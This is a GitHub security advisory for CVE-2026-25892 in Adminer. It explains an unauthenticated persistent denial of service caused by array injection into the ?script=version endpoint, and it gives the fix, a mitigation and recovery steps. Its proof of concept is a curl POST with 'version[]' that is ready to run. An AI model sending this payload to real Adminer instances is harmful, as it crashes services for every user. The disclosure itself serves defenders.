# [H] Adminer has an Unauthenticated Persistent DoS via Array Injection in ?script=version Endpoint

## Summary
Severity: High
Advisory: GHSA-q4f2-39gr-45jh
CVE: CVE-2026-25892
CWE: CWE-20
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-02-10
Source: https://github.com/advisories/GHSA-q4f2-39gr-45jh
Type: github-advisory

## Affected
- Packagist: `vrana/adminer` — affected >=4.6.2 <5.4.2

## Details
### Summary
Adminer v5.4.1 has a version check mechanism where `adminer.org` sends signed version info via JavaScript postMessage, which the browser then POSTs to `?script=version`. This endpoint lacks origin validation and accepts POST data from any source. An attacker can POST `version[]` parameter which PHP converts to an array. On next page load, `openssl_verify()` receives this array instead of string and throws `TypeError`, returning HTTP 500 to all users.

### Fix

Upgrade to Adminer 5.4.2.

**Mitigation** (if you can't upgrade): Make file `adminer.version` in temp directory (usually the value of [upload_tmp_dir](https://www.php.net/ini.core#ini.upload-tmp-dir)) unwritable by web server.

### Details

**1. Intended design of `?script=version`:**

The endpoint is designed to receive version data from `adminer.org` via browser JavaScript:
- `functions.js` line 102-117: Creates iframe to `https://www.adminer.org/version/`
- Adminer.org sends signed version data via `postMessage`
- JavaScript POSTs this to `?script=version`
- Server stores in `/tmp/adminer.version` for signature verification

```javascript
// functions.js line 117
ajax(url + 'script=version', () => { }, event.data + '&token=' + token);
```

**2. The vulnerability:**

The endpoint only checks `$_GET["script"] == "version"` - it does not validate:
- Request origin (no CSRF token check for this endpoint)
- Request source (any HTTP client can POST)
- Parameter types (`version` expected as string, array not rejected)

```php
// bootstrap.inc.php line 32-40
if ($_GET["script"] == "version") {
    $filename = get_temp_dir() . "/adminer.version";
    @unlink($filename);
    $fp = file_open_lock($filename);
    if ($fp) {
        file_write_unlock($fp, serialize(array("signature" => $_POST["signature"], "version" => $_POST["version"])));
    }
    exit;
}
```

**3. Type confusion crash:**

When POST contains `version[]` instead of `version`, PHP creates an array. When Adminer reads this file and passes to `openssl_verify()`:

```php
// design.inc.php line 75
if (openssl_verify($version["version"], base64_decode($version["signature"]), $public) == 1) {
```

PHP 8.x throws:
```
TypeError: openssl_verify(): Argument #1 ($data) must be of type string, array given
```

### PoC

**Steps to Reproduce:**

**Step 1:** Verify Adminer is running and accessible.
```bash
curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8888/adminer-5.4.1.php
```
Expected output:
```
200
```

**Step 2:** Send the malicious POST request. The `version[]` syntax causes PHP to create an array instead of a string.
```bash
curl -X POST "http://localhost:8888/adminer-5.4.1.php?script=version" \
     -d "signature=x&version[]=INJECTED"
```
Expected output: Empty response (no error).

**Step 3:** Access Adminer again to trigger the crash.
```bash
curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8888/adminer-5.4.1.php
```
Expected output:
```
500
```

**Step 4:** (Optional) View the PHP error in server logs.
```
PHP Fatal error:  Uncaught TypeError: openssl_verify(): Argument #1 ($data) must be of type string, array given in adminer-5.4.1.php:1386
```

**Step 5:** (Optional) Inspect the poisoned file.
```bash
cat /tmp/adminer.version
```
Expected output:
```
a:2:{s:9:"signature";s:1:"x";s:7:"version";a:1:{i:0;s:8:"INJECTED";}}
```

**Recovery:**
```bash
rm /tmp/adminer.version
```
After deletion, Adminer returns HTTP 200.

---

### Impact

**Type:** Denial of Service

**Root cause:** The `?script=version` endpoint is designed to receive data from `adminer.org` via JavaScript, but lacks server-side validation. Any HTTP client can POST directly to this endpoint. Combined with missing type validation before `openssl_verify()`, this allows persistent DoS.

**Affected users:** Any Adminer instance accessible over the network.

## References
- https://github.com/vrana/adminer/security/advisories/GHSA-q4f2-39gr-45jh
- https://nvd.nist.gov/vuln/detail/CVE-2026-25892
- https://github.com/vrana/adminer/commit/21d3a3150388677b18647d68aec93b7850e457d3
- https://github.com/vrana/adminer
- https://github.com/vrana/adminer/releases/tag/v5.4.2
